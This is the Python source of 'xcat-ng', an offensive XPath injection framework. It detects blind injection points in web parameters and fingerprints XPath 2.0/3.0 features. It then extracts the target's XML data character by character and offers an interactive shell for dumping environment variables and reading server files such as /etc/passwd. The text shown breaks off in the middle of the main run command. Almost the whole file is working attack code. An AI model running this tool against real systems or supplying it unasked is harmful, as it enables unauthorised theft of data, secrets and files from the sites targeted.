#!/usr/bin/env python3
"""xcat-ng  --  Modern XPath Injection Framework (next-generation)"""

from __future__ import annotations

import argparse
import asyncio
import collections
import importlib.util
import math
import re
import readline  # noqa: F401 — enables arrow-key history in shell
import shlex
import statistics
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

import difflib

try:
    import httpx
except ImportError:
    sys.exit("[!] pip install httpx")


# ══════════════════════════════════════════════════════════════════════════════
# Terminal colours
# ══════════════════════════════════════════════════════════════════════════════

class T:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    GRAY    = "\033[90m"


def _c(text: str, *codes: str) -> str:
    return "".join(codes) + text + T.RESET


def info(m: str):  print(_c(f"[*] {m}", T.BLUE))
def ok(m: str):    print(_c(f"[+] {m}", T.GREEN))
def warn(m: str):  print(_c(f"[!] {m}", T.YELLOW))
def err(m: str):   print(_c(f"[-] {m}", T.RED))

_verbose = False
def dbg(m: str):
    if _verbose:
        print(_c(f"[D] {m}", T.GRAY))


BANNER = (
    _c("\n ██╗  ██╗ ██████╗ █████╗ ████████╗      ███╗   ██╗ ██████╗", T.CYAN, T.BOLD) + "\n" +
    _c(" ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝      ████╗  ██║██╔════╝", T.CYAN, T.BOLD) + "\n" +
    _c("  ╚███╔╝ ██║     ███████║   ██║   █████╗██╔██╗ ██║██║  ███╗", T.CYAN, T.BOLD) + "\n" +
    _c("  ██╔██╗ ██║     ██╔══██║   ██║   ╚════╝██║╚██╗██║██║   ██║", T.CYAN, T.BOLD) + "\n" +
    _c(" ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝", T.CYAN, T.BOLD) + "\n" +
    _c(" ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝", T.CYAN, T.BOLD) + "\n" +
    _c(" Modern XPath Injection Framework  (next-generation)\n", T.YELLOW)
)


# ══════════════════════════════════════════════════════════════════════════════
# Constants
# ══════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT     = 15
DEFAULT_CONCURRENCY = 10
FAST_MODE_LEN       = 15
MISSING_CHAR        = "?"

# Frequency-ordered charset for linear search (most common English chars first)
# Apostrophe excluded — breaks XPath substring-before() string literals.
# It is added separately in ASCII_SEARCH_SPACE for the linear fallback.
ASCII_SEARCH_SPACE = (
    "etaoinshrdlcumwfgypbvkjxqz"
    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    "0123456789"
    "+./:@_ -,()!"
)
# Full charset used only in linear scan (apostrophe handled via quote-swap)
ASCII_SEARCH_SPACE_FULL = ASCII_SEARCH_SPACE + "'"


# ══════════════════════════════════════════════════════════════════════════════
# Injection templates
# ══════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class Injection:
    """
    Mirrors original xcat Injection.
    test_payloads: list of (payload_template, expected_bool)
    expr_template: string template or callable for wrapping an XPath expression
    """
    name:      str
    example:   str
    # list of (template_with_{working}, expected_result)
    tests:     Tuple[Tuple[str, bool], ...]
    # template string "{working} and {expression} ..." or callable(working, expr)
    expr_tmpl: object  # str | Callable[[str, str], str]

    def wrap(self, working: str, expression: str) -> str:
        if callable(self.expr_tmpl):
            return self.expr_tmpl(working, expression)
        return self.expr_tmpl.format(working=working, expression=expression)

    def test_payloads(self, working: str) -> List[Tuple[str, bool]]:
        return [(t.format(working=working), expected) for t, expected in self.tests]


INJECTIONS: List[Injection] = [
    Injection(
        name    = "integer",
        example = "/lib/book[id=?]",
        tests   = (
            ("{working} and 1=1", True),
            ("{working} and 1=2", False),
        ),
        expr_tmpl = "{working} and {expression}",
    ),
    Injection(
        name    = "string - single quote",
        example = "/lib/book[name='?']",
        tests   = (
            ("{working}' and '1'='1", True),
            ("{working}' and '1'='2", False),
        ),
        expr_tmpl = "{working}' and {expression} and '1'='1",
    ),
    Injection(
        name    = "string - double quote",
        example = '/lib/book[name="?"]',
        tests   = (
            ('{working}" and "1"="1', True),
            ('{working}" and "1"="2', False),
        ),
        expr_tmpl = '{working}" and {expression} and "1"="1',
    ),
    Injection(
        name    = "string - single quote (trailing close)",
        example = "/lib/book[name='?')]",
        tests   = (
            ("{working}') and ('1'='1", True),
            ("{working}') and ('1'='2", False),
        ),
        expr_tmpl = "{working}') and {expression} and ('1'='1",
    ),
    Injection(
        name    = "string - double quote (trailing close)",
        example = '/lib/book[name="?")]',
        tests   = (
            ('{working}") and ("1"="1', True),
            ('{working}") and ("1"="2', False),
        ),
        expr_tmpl = '{working}") and {expression} and ("1"="1',
    ),
    Injection(
        name    = "attribute name - prefix",
        example = "/lib/book[?=value]",
        tests   = (
            ("1=1 and {working}", True),
            ("1=2 and {working}", False),
        ),
        expr_tmpl = lambda w, e: f"{e} and {w}",
    ),
    Injection(
        name    = "attribute name - postfix",
        example = "/lib/book[value=?]",
        tests   = (
            ("{working} and not 1=2 and {working}", True),
            ("{working} and 1=2 and {working}",     False),
        ),
        expr_tmpl = lambda w, e: f"{w} and {e} and {w}",
    ),
    Injection(
        name    = "element name - postfix",
        example = "/lib/?something",
        tests   = (
            ("{working}[true()]",  True),
            ("{working}[false()]", False),
        ),
        expr_tmpl = lambda w, e: f"{w}[{e}]",
    ),
    Injection(
        name    = "function call - single quote",
        example = "/lib/something[function(?)]",
        tests   = (
            ("{working}') and true() and string('1'='1",  True),
            ("{working}') and false() and string('1'='1", False),
        ),
        expr_tmpl = "{working}') and {expression} and string('1'='1",
    ),
    Injection(
        name    = "function call - double quote",
        example = '/lib/something[function(?)]',
        tests   = (
            ('{working}") and true() and string("1"="1',  True),
            ('{working}") and false() and string("1"="1', False),
        ),
        expr_tmpl = '{working}") and {expression} and string("1"="1',
    ),
]


# ══════════════════════════════════════════════════════════════════════════════
# Features  (mirrors original xcat features.py)
# ══════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class Feature:
    name:        str
    # XPath expressions that must ALL be true for the feature to be present
    tests:       Tuple[str, ...]
    description: str = ""


FEATURES: List[Feature] = [
    Feature("xpath-2", (
        "lower-case('A')='a'",
        "ends-with('thetest','test')",
        "encode-for-uri('test')='test'",
    ), "XPath 2.0"),
    Feature("xpath-3", (
        "boolean(generate-id(/))",
    ), "XPath 3.0"),
    Feature("xpath-3.1", (
        "contains-token('a','a')",
    ), "XPath 3.1"),
    Feature("normalize-space", (
        "normalize-space('  a  b ')='a b'",
    ), "normalize-space()"),
    Feature("substring-search", (
        f"string-length(substring-before('{ASCII_SEARCH_SPACE}','h'))={ASCII_SEARCH_SPACE.find('h')}",
        f"string-length(substring-before('{ASCII_SEARCH_SPACE}','o'))={ASCII_SEARCH_SPACE.find('o')}",
    ), "substring-before() char search"),
    Feature("codepoint-search", (
        "string-to-codepoints('test')[1]=116",
    ), "string-to-codepoints() char search"),
    Feature("environment-variables", (
        "exists(available-environment-variables())",
    ), "available-environment-variables()"),
    Feature("document-uri", (
        "string-length(document-uri(/))>0",
    ), "document-uri()"),
    Feature("base-uri", (
        "string-length(base-uri())>0",
    ), "base-uri()"),
    Feature("current-datetime", (
        "string-length(string(current-dateTime()))>0",
    ), "current-dateTime()"),
    Feature("unparsed-text", (
        "unparsed-text-available(document-uri(/))",
    ), "unparsed-text()"),
    Feature("doc-function", (
        "doc-available(document-uri(/))",
    ), "doc()"),
    Feature("linux", (
        "unparsed-text-available('/etc/passwd')",
    ), "Linux OS"),
]


# ══════════════════════════════════════════════════════════════════════════════
# Request parsing
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ParsedRequest:
    method:  str
    url:     str
    headers: Dict[str, str]
    params:  Dict[str, str]   # query string params
    body:    Dict[str, str]   # POST body params

    @property
    def all_params(self) -> Dict[str, str]:
        return {**self.params, **self.body}

    @classmethod
    def from_burp(cls, path: str) -> "ParsedRequest":
        text  = Path(path).read_text(errors="replace")
        lines = text.splitlines()

        m = re.match(r"^(\w+)\s+(\S+)\s+HTTP/", lines[0])
        if not m:
            sys.exit(f"[-] Cannot parse request line: {lines[0]!r}")

        method, path_qs = m.group(1).upper(), m.group(2)
        headers: Dict[str, str] = {}
        i = 1
        while i < len(lines) and lines[i].strip():
            if ":" in lines[i]:
                k, _, v = lines[i].partition(":")
                headers[k.strip()] = v.strip()
            i += 1
        raw_body = "\n".join(lines[i + 1:]).strip()

        host   = headers.get("Host", "localhost")
        scheme = "https" if "443" in host else "http"
        parsed = urlparse(f"{scheme}://{host}{path_qs}")
        params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

        body: Dict[str, str] = {}
        ct = headers.get("Content-Type", "")
        if raw_body and "application/x-www-form-urlencoded" in ct:
            body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

        for drop in ("Accept-Encoding", "Content-Length", "If-None-Match"):
            headers.pop(drop, None)

        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return cls(method=method, url=base, headers=headers, params=params, body=body)

    @classmethod
    def from_args(cls, url: str, method: str,
                  params: Dict[str, str], headers: Dict[str, str],
                  body: Dict[str, str]) -> "ParsedRequest":
        parsed = urlparse(url)
        q = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
        q.update(params)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return cls(method=method, url=base, headers=headers, params=q, body=body)


# ══════════════════════════════════════════════════════════════════════════════
# Attack context
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class AttackContext:
    req:          ParsedRequest
    target_param: str
    match_fn:     Callable[[int, str], bool]
    concurrency:  int
    fast_mode:    bool
    timeout:      int
    proxy:        Optional[str]
    injection:    Optional[Injection]          = None
    tamper_fn:    Optional[Callable]           = None
    features:     Dict[str, bool]              = field(default_factory=dict)
    # Cached most-common chars/strings — speeds up repeated extractions
    common_chars: collections.Counter          = field(default_factory=collections.Counter)
    common_strs:  collections.Counter          = field(default_factory=collections.Counter)
    _client:      Optional[httpx.AsyncClient]  = field(default=None, repr=False)
    _sem:         Optional[asyncio.Semaphore]  = field(default=None, repr=False)

    async def start(self):
        proxies = {"all://": self.proxy} if self.proxy else None
        self._client = httpx.AsyncClient(timeout=self.timeout, verify=False, proxies=proxies)
        self._sem    = asyncio.Semaphore(self.concurrency)

    async def close(self):
        if self._client:
            await self._client.aclose()

    @property
    def working_value(self) -> str:
        """Current value of the target parameter — used as injection base."""
        return self.req.all_params.get(self.target_param, "")

    def has(self, feature: str) -> bool:
        return self.features.get(feature, False)

    def ordered_chars(self) -> str:
        """ASCII_SEARCH_SPACE ordered by observed frequency."""
        seen = sorted(self.common_chars, key=lambda c: -self.common_chars[c])
        tail = [c for c in ASCII_SEARCH_SPACE_FULL if c not in self.common_chars]
        return "".join(seen) + "".join(tail)


# ══════════════════════════════════════════════════════════════════════════════
# HTTP  (send requests, check oracle)
# ══════════════════════════════════════════════════════════════════════════════

async def _send(ctx: AttackContext, overrides: Dict[str, str]) -> Tuple[int, str]:
    import random
    q = dict(ctx.req.params)
    b = dict(ctx.req.body)
    for k, v in overrides.items():
        if k in q:   q[k] = v
        else:         b[k] = v
    # Cache buster
    q["_xcng"] = str(random.randint(10000, 99999))

    kw = dict(headers=ctx.req.headers)
    if ctx.req.method.upper() in ("GET", "HEAD", "DELETE"):
        kw["params"] = q
    else:
        kw["data"] = {**q, **b} if b else q

    if ctx.tamper_fn:
        ctx.tamper_fn(ctx, kw)

    async with ctx._sem:
        try:
            r = await ctx._client.request(ctx.req.method, ctx.req.url, **kw)
            return r.status_code, r.text
        except Exception as exc:
            dbg(f"request error: {exc}")
            return 0, ""


async def send_payload(ctx: AttackContext, param: str, payload: str) -> Tuple[int, str]:
    """Send a raw payload for a specific parameter."""
    return await _send(ctx, {param: payload})


async def check(ctx: AttackContext, expression: str) -> bool:
    """
    Core oracle — mirrors original xcat check().
    Wraps expression into injection payload, sends request, returns match result.
    """
    payload = ctx.injection.wrap(ctx.working_value, expression)
    st, body = await send_payload(ctx, ctx.target_param, payload)
    return ctx.match_fn(st, body)


# ══════════════════════════════════════════════════════════════════════════════
# Detection
# ══════════════════════════════════════════════════════════════════════════════

async def detect_injections(ctx: AttackContext, param: str) -> List[Injection]:
    """
    Mirrors original xcat detect_injections():
    For each injector, send all test payloads and check if results match expectations.
    Returns list of all working injectors (usually just one).
    """
    working = ctx.req.all_params.get(param, "")
    results = []

    for inj in INJECTIONS:
        payloads = inj.test_payloads(working)
        checks   = await asyncio.gather(*[
            _oracle_raw(ctx, param, pl, expected)
            for pl, expected in payloads
        ])
        if all(checks):
            dbg(f"  injection confirmed: {inj.name!r} on param={param!r}")
            results.append(inj)

    return results


async def _oracle_raw(ctx: AttackContext, param: str,
                      payload: str, expected: bool) -> bool:
    """Send a raw test payload and check if result matches expected bool."""
    st, body = await send_payload(ctx, param, payload)
    got = ctx.match_fn(st, body)
    return got == expected


async def auto_discover(ctx: AttackContext) -> Optional[Tuple[str, Injection]]:
    """
    Try all parameters in order until a working injection is found.
    If --param was specified, only that parameter is tested.
    Returns (param, injection) or None.
    """
    params = ctx.req.all_params

    if ctx.target_param and ctx.target_param in params:
        ranked = [ctx.target_param]
    else:
        # Prefer string (non-numeric) params, longer values first
        ranked = sorted(params, key=lambda k: (params[k].isdigit(), -len(params[k])))

    info(f"Testing {len(ranked)} parameter(s): {', '.join(_c(p, T.CYAN) for p in ranked)}")

    for param in ranked:
        info(f"  Probing: {_c(param, T.CYAN)}")
        hits = await detect_injections(ctx, param)
        if hits:
            return param, hits[0]

    return None


async def detect_features(ctx: AttackContext) -> Dict[str, bool]:
    """
    Mirrors original xcat detect_features():
    Test each feature — all its XPath expressions must evaluate to true.
    """
    results: Dict[str, bool] = {}

    async def probe(feat: Feature):
        checks = await asyncio.gather(*[check(ctx, expr) for expr in feat.tests])
        results[feat.name] = all(checks)

    await asyncio.gather(*[probe(f) for f in FEATURES])

    for feat in FEATURES:
        val  = results.get(feat.name, False)
        icon = _c("✓", T.GREEN) if val else _c("✗", T.RED)
        print(f"  {icon} {feat.name:<32} {_c(feat.description, T.GRAY)}")

    return results


# ══════════════════════════════════════════════════════════════════════════════
# Algorithms  (mirrors original xcat algorithms.py)
# ══════════════════════════════════════════════════════════════════════════════

async def binary_search(ctx: AttackContext, expression: str,
                        lo: int = 0, hi: int = 25, _depth: int = 0) -> int:
    """
    Mirrors original xcat binary_search().
    Finds integer value of a numeric XPath expression.
    """
    if _depth > 14:
        return -1
    if await check(ctx, f"({expression}) > {hi}"):
        return await binary_search(ctx, expression, lo, hi * 2, _depth + 1)

    while lo <= hi:
        mid = (lo + hi) // 2
        if await check(ctx, f"({expression}) < {mid}"):
            hi = mid - 1
        elif await check(ctx, f"({expression}) > {mid}"):
            lo = mid + 1
        else:
            return mid
    return -1


async def _count(ctx: AttackContext, expression: str) -> int:
    result = await binary_search(ctx, f"count({expression})", lo=0)
    return max(0, result)


async def _string_length(ctx: AttackContext, expression: str) -> int:
    result = await binary_search(ctx, f"string-length({expression})", lo=0)
    if result < 0 or result > 4096:
        return 0
    return result


# ── character search strategies (mirrors original xcat algorithms.py) ──────

async def _codepoint_search(ctx: AttackContext, expression: str) -> Optional[str]:
    """O(log N) via string-to-codepoints (XPath 2.0)."""
    code = await binary_search(ctx, f"string-to-codepoints({expression})[1]", lo=0, hi=255)
    return chr(code) if code > 0 else None


async def _substring_search(ctx: AttackContext, expression: str) -> Optional[str]:
    """
    O(log N) via substring-before on ASCII_SEARCH_SPACE.
    Mirrors original xcat substring_search().
    Note: first char needs explicit check (substring-before returns "" for both
    "not found" and "found at position 0").
    """
    space = ASCII_SEARCH_SPACE
    if await check(ctx, f"{expression}='{space[0]}'"):
        return space[0]
    idx = await binary_search(
        ctx,
        f"string-length(substring-before('{space}',{expression}))",
        lo=0, hi=len(space)
    )
    return space[idx] if 0 < idx < len(space) else None


async def _linear_search(ctx: AttackContext, expression: str) -> Optional[str]:
    """O(N) frequency-ordered linear scan. Fallback for XPath 1.0."""
    for ch in ctx.ordered_chars():
        q = '"' if ch == "'" else "'"
        if await check(ctx, f"{expression}={q}{ch}{q}"):
            ctx.common_chars[ch] += 1
            return ch
    return None


async def get_char(ctx: AttackContext, expression: str) -> Optional[str]:
    """Pick the best character search strategy based on detected features."""
    if ctx.has("codepoint-search"):
        return await _codepoint_search(ctx, expression)
    if ctx.has("substring-search"):
        return await _substring_search(ctx, expression)
    return await _linear_search(ctx, expression)


# ── progress bar ─────────────────────────────────────────────────────────────

def _progress(done: int, total: int, partial: str):
    """Live progress bar on stderr — keeps stdout clean for XML output."""
    bar_w  = 28
    filled = int(bar_w * done / total) if total else 0
    bar    = "█" * filled + "░" * (bar_w - filled)
    print(
        f"\r [{T.CYAN}{bar}{T.RESET}] {done}/{total}  {T.GREEN}{partial}{T.RESET}",
        end="", flush=True, file=sys.stderr,
    )


# ── string extraction ─────────────────────────────────────────────────────────

async def _get_common_string(ctx: AttackContext,
                             expression: str, length: int) -> Optional[str]:
    """Try previously seen strings of the same length before char-by-char."""
    if length >= 10:
        return None
    candidates = [s for s, _ in ctx.common_strs.most_common() if len(s) == length][:5]
    if not candidates:
        return None
    hits = await asyncio.gather(*[check(ctx, f"{expression}='{c}'") for c in candidates])
    for hit, s in zip(hits, candidates):
        if hit:
            ctx.common_strs[s] += 1
            return s
    return None


async def get_string(ctx: AttackContext, expression: str, fast: bool = False) -> str:
    """
    Mirrors original xcat get_string().
    Extracts the string value of an XPath expression character by character.
    Shows live progress bar on stderr.
    """
    if ctx.has("normalize-space"):
        work = f"normalize-space({expression})"
    else:
        work = expression

    total = await _string_length(ctx, work)
    if total <= 0:
        return ""

    # Try common strings cache first
    cached = await _get_common_string(ctx, work, total)
    if cached is not None:
        return cached

    fetch = min(FAST_MODE_LEN, total) if fast else total
    chars = [MISSING_CHAR] * fetch
    done  = [0]

    async def fetch_char(pos: int):
        ch = await get_char(ctx, f"substring({work},{pos},1)")
        chars[pos - 1] = ch or MISSING_CHAR
        done[0] += 1
        _progress(done[0], fetch, "".join(chars))

    await asyncio.gather(*[fetch_char(i) for i in range(1, fetch + 1)])
    print(file=sys.stderr)  # newline after progress bar

    result = "".join(chars)
    if fast and fetch < total:
        result += f"... ({total - fetch} more)"
    elif total <= 10:
        ctx.common_strs[result] += 1

    return result


# ══════════════════════════════════════════════════════════════════════════════
# XML tree exfiltration  (mirrors original xcat get_nodes / display_xml)
# ══════════════════════════════════════════════════════════════════════════════

async def exfiltrate_node(
    ctx:          AttackContext,
    xpath:        str,
    depth:        int = 0,
    max_depth:    int = 12,
    max_children: int = 40,
    xml_lines:    Optional[List[str]] = None,
) -> None:
    """
    Recursively extract an XML node and all its descendants.
    Mirrors original xcat get_nodes() but:
      - Prints each tag to stdout immediately (live output)
      - Accumulates lines in xml_lines for final summary
      - Progress bars go to stderr
    """
    indent = "  " * depth

    # Extract node name, attributes, children count in parallel
    name, attr_count, n_children = await asyncio.gather(
        get_string(ctx, f"name({xpath})",   fast=ctx.fast_mode),
        _count(ctx, f"{xpath}/@*"),
        _count(ctx, f"{xpath}/*"),
    )

    if not name:
        name = f"node_{depth}"

    # Extract attributes in parallel
    attrs: Dict[str, str] = {}
    if attr_count:
        attr_pairs = await asyncio.gather(*[
            asyncio.gather(
                get_string(ctx, f"name(({xpath}/@*)[{i}])", fast=ctx.fast_mode),
                get_string(ctx, f"string(({xpath}/@*)[{i}])", fast=ctx.fast_mode),
            )
            for i in range(1, attr_count + 1)
        ])
        attrs = {k: v for k, v in attr_pairs if k}

    attr_str = (" " + " ".join(f'{k}="{v}"' for k, v in attrs.items())) if attrs else ""
    open_tag = f"{indent}<{name}{attr_str}>"

    # Print open tag immediately
    print(_c(open_tag, T.CYAN))
    if xml_lines is not None:
        xml_lines.append(open_tag)

    if n_children == 0 or depth >= max_depth:
        # Leaf: extract text
        value = await get_string(ctx, f"string({xpath})", fast=ctx.fast_mode)
        if value:
            val_line = f"{indent}  {value}"
            print(_c(val_line, T.GREEN))
            if xml_lines is not None:
                xml_lines.append(val_line)
    else:
        for i in range(1, min(n_children, max_children) + 1):
            await exfiltrate_node(
                ctx, f"({xpath}/*)[{i}]",
                depth + 1, max_depth, max_children, xml_lines,
            )

    close_tag = f"{indent}</{name}>"
    print(_c(close_tag, T.CYAN))
    if xml_lines is not None:
        xml_lines.append(close_tag)


# ══════════════════════════════════════════════════════════════════════════════
# Interactive shell  (mirrors original xcat shell.py)
# ══════════════════════════════════════════════════════════════════════════════

SHELL_HELP = f"""
{_c("xcat-ng interactive shell", T.BOLD)}

  {_c("get  <xpath>",      T.CYAN)}    Dump XML subtree at XPath expression
  {_c("get-string <xpath>",T.CYAN)}    Get string value of XPath expression
  {_c("env  [name]",       T.CYAN)}    List env vars or get specific one
  {_c("pwd",               T.CYAN)}    Print working directory (base-uri / document-uri)
  {_c("time",              T.CYAN)}    Print server date/time
  {_c("cat  <path>",       T.CYAN)}    Read file via unparsed-text()
  {_c("find <name>",       T.CYAN)}    Search file in parent directories
  {_c("features",          T.CYAN)}    Show detected feature flags
  {_c("toggle <feature>",  T.CYAN)}    Toggle a feature on/off
  {_c("help",              T.CYAN)}    Show this message
  {_c("exit",              T.CYAN)}    Exit
"""


async def shell_loop(ctx: AttackContext):
    print(SHELL_HELP)

    while True:
        try:
            line = input(f"{_c('XCat', T.RED)}{_c('$ ', T.GREEN)}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue

        parts = shlex.split(line)
        cmd, args = parts[0].lower(), parts[1:]

        try:
            # ── exit ─────────────────────────────────────────────────────────
            if cmd in ("exit", "quit"):
                break

            # ── help ─────────────────────────────────────────────────────────
            elif cmd == "help":
                print(SHELL_HELP)

            # ── get ──────────────────────────────────────────────────────────
            elif cmd == "get":
                if not args:
                    err("Usage: get <xpath>"); continue
                xml_lines: List[str] = []
                await exfiltrate_node(ctx, args[0], xml_lines=xml_lines)
                print()
                print(_c("═" * 64, T.BOLD))
                for ln in xml_lines:
                    s = ln.strip()
                    print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
                print(_c("═" * 64, T.BOLD))

            # ── get-string ───────────────────────────────────────────────────
            elif cmd == "get-string":
                if not args:
                    err("Usage: get-string <xpath>"); continue
                print(_c(await get_string(ctx, args[0]), T.GREEN))

            # ── env ──────────────────────────────────────────────────────────
            elif cmd == "env":
                if not ctx.has("environment-variables"):
                    warn("Feature 'environment-variables' not detected"); continue
                if args:
                    val = await get_string(ctx, f"environment-variable('{args[0]}')")
                    print(_c(val, T.GREEN))
                else:
                    cnt = await _count(ctx, "available-environment-variables()")
                    for i in range(1, cnt + 1):
                        name = await get_string(ctx, f"available-environment-variables()[{i}]")
                        val  = await get_string(ctx, f"environment-variable('{name}')")
                        print(f"{_c(name, T.CYAN)}={_c(val, T.GREEN)}")

            # ── pwd ──────────────────────────────────────────────────────────
            elif cmd == "pwd":
                if ctx.has("base-uri"):
                    print(_c(await get_string(ctx, "base-uri()"), T.GREEN))
                elif ctx.has("document-uri"):
                    print(_c(await get_string(ctx, "document-uri(/)"), T.GREEN))
                else:
                    warn("Neither base-uri nor document-uri detected")

            # ── time ─────────────────────────────────────────────────────────
            elif cmd == "time":
                if not ctx.has("current-datetime"):
                    warn("Feature 'current-datetime' not detected"); continue
                print(_c(await get_string(ctx, "string(current-dateTime())"), T.GREEN))

            # ── cat ──────────────────────────────────────────────────────────
            elif cmd == "cat":
                if not args:
                    err("Usage: cat <path>"); continue
                if not ctx.has("unparsed-text"):
                    warn("Feature 'unparsed-text' not detected"); continue
                path = args[0]
                if not await check(ctx, f"unparsed-text-available('{path}')"):
                    warn(f"File not available: {path}")
                    if input("Try anyway? [y/N] ").strip().lower() != "y":
                        continue
                cnt = await _count(ctx, f"unparsed-text-lines('{path}')")
                ok(f"Lines: {cnt}")
                for i in range(1, cnt + 1):
                    line_val = await get_string(ctx, f"unparsed-text-lines('{path}')[{i}]")
                    print(line_val)

            # ── find ─────────────────────────────────────────────────────────
            elif cmd == "find":
                if not args:
                    err("Usage: find <filename>"); continue
                for i in range(10):
                    rel = ("../" * i) + args[0]
                    expr = f"resolve-uri('{rel}', document-uri(/))"
                    if ctx.has("doc-function") and await check(ctx, f"doc-available({expr})"):
                        ok(f"[XML] {rel}")
                    if ctx.has("unparsed-text") and await check(ctx, f"unparsed-text-available({expr})"):
                        ok(f"[TXT] {rel}")

            # ── features ─────────────────────────────────────────────────────
            elif cmd == "features":
                for k, v in ctx.features.items():
                    icon = _c("on", T.GREEN) if v else _c("off", T.RED)
                    print(f"  {k:<34} {icon}")

            # ── toggle ────────────────────────────────────────────────────────
            elif cmd == "toggle":
                if not args:
                    err("Usage: toggle <feature>"); continue
                f = args[0]
                ctx.features[f] = not ctx.features.get(f, False)
                state = _c("on", T.GREEN) if ctx.features[f] else _c("off", T.RED)
                print(f"{f} → {state}")

            else:
                err(f"Unknown command '{cmd}'. Type 'help'.")

        except KeyboardInterrupt:
            print()
        except Exception as exc:
            err(f"Error: {exc}")
            if _verbose:
                import traceback; traceback.print_exc()


# ══════════════════════════════════════════════════════════════════════════════
# Setup helpers
# ══════════════════════════════════════════════════════════════════════════════

def _make_match_fn(args: argparse.Namespace) -> Callable[[int, str], bool]:
    """Build oracle function from CLI flags. Mirrors original xcat match_function."""
    ts     = getattr(args, "true_string",  None)
    tc     = getattr(args, "true_code",    None)
    fs     = getattr(args, "false_string", None)
    fc     = getattr(args, "false_code",   None)

    ts_neg = tc_neg = False
    if ts and ts.startswith("!"):
        ts_neg, ts = True, ts[1:]
    if tc and str(tc).startswith("!"):
        tc_neg, tc = True, str(tc)[1:]

    tc_int = int(tc) if tc else None
    fc_int = int(fc) if fc else None

    def fn(status: int, body: str) -> bool:
        if ts:
            if (ts in body) ^ ts_neg is False:
                return False
        if tc_int is not None:
            if (status == tc_int) ^ tc_neg is False:
                return False
        if fs and fs in body:
            return False
        if fc_int and status == fc_int:
            return False
        return True

    return fn


def _build_context(args: argparse.Namespace) -> AttackContext:
    if getattr(args, "request", None):
        req = ParsedRequest.from_burp(args.request)
    elif getattr(args, "url", None):
        headers: Dict[str, str] = {}
        for h in (getattr(args, "header", None) or []):
            if ":" in h:
                k, _, v = h.partition(":"); headers[k.strip()] = v.strip()
        params: Dict[str, str] = {}
        for p in (getattr(args, "param_values", None) or []):
            if "=" in p:
                k, _, v = p.partition("="); params[k] = v
        body: Dict[str, str] = {}
        for b in (getattr(args, "body_param", None) or []):
            if "=" in b:
                k, _, v = b.partition("="); body[k] = v
        req = ParsedRequest.from_args(
            url=args.url, method=args.method,
            params=params, headers=headers, body=body,
        )
    else:
        sys.exit("[-] Provide -r/--request FILE  or  --url URL")

    if not any([
        getattr(args, "true_string",  None),
        getattr(args, "true_code",    None),
        getattr(args, "false_string", None),
        getattr(args, "false_code",   None),
    ]):
        sys.exit(
            "[-] Specify at least one oracle flag:\n"
            "    --true-string TEXT    string present in a TRUE response\n"
            "    --false-string TEXT   string present in a FALSE response\n"
            "    --true-code CODE      HTTP status for TRUE  (e.g. 200)\n"
            "    --false-code CODE     HTTP status for FALSE (e.g. 404)"
        )

    target = getattr(args, "target_param", None) or ""
    if not target:
        first = next(iter(req.all_params), None)
        if first:
            warn(f"No --param specified, will probe all parameters")
        target = first or ""

    tamper_fn = None
    if getattr(args, "tamper", None):
        spec = importlib.util.spec_from_file_location("tamper", args.tamper)
        mod  = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        tamper_fn = getattr(mod, "tamper", None)

    ctx = AttackContext(
        req=req, target_param=target,
        match_fn=_make_match_fn(args),
        concurrency=args.concurrency,
        fast_mode=getattr(args, "fast", False),
        timeout=args.timeout,
        proxy=getattr(args, "proxy", None),
        tamper_fn=tamper_fn,
    )
    for feat in (getattr(args, "enable", None) or []):
        ctx.features[feat] = True
    for feat in (getattr(args, "disable", None) or []):
        ctx.features[feat] = False

    return ctx


async def _setup(ctx: AttackContext) -> bool:
    """
    Discover injection, set ctx.target_param + ctx.injection, detect features.
    Returns True on success.
    """
    result = await auto_discover(ctx)
    if not result:
        err("No injection point found.")
        warn("Tips:")
        warn("  --true-string TEXT    a string present when XPath condition is TRUE")
        warn("  --false-string TEXT   a string present when XPath condition is FALSE")
        warn("  --true-string '!...'  prefix with ! to negate")
        warn("  -v                    verbose debug output")
        return False

    param, inj = result
    ctx.target_param = param
    ctx.injection    = inj

    ok(f"Injection  param={_c(param, T.CYAN)}  type={_c(inj.name, T.YELLOW)}")
    print(f"  Example : {inj.example}")
    print()

    info("Detecting server features...")
    feats = await detect_features(ctx)
    ctx.features.update(feats)
    print()

    return True


# ══════════════════════════════════════════════════════════════════════════════
# Commands
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_detect(args: argparse.Namespace):
    ctx = _build_context(args)
    await ctx.start()
    try:
        await _setup(ctx)
    finally:
        await ctx.close()


async def cmd_run(args: argparse.Namespace):
    ctx = _build_context(args)
    await ctx.start()
    try:
        if not await _setup(ctx):
            sys.exit(1)

        info("Extracting XML document  (live output below, progress on stderr)...")
        print()
        print(_c("─" * 64, T.GRAY))

        xml_lines: List[str] = []
        try:
            await exfiltrate_node(
                ctx, "/*", depth=0,
                max_depth=getattr(args, "max_depth", 12),
                max_children=getattr(args, "max_children", 40),
                xml_lines=xml_lines,
            )
        except KeyboardInterrupt:
            warn("Interrupted — partial result below")

        print()
        print(_c("═" * 64, T.BOLD))
        print(_c("  EXTRACTED XML", T.BOLD))
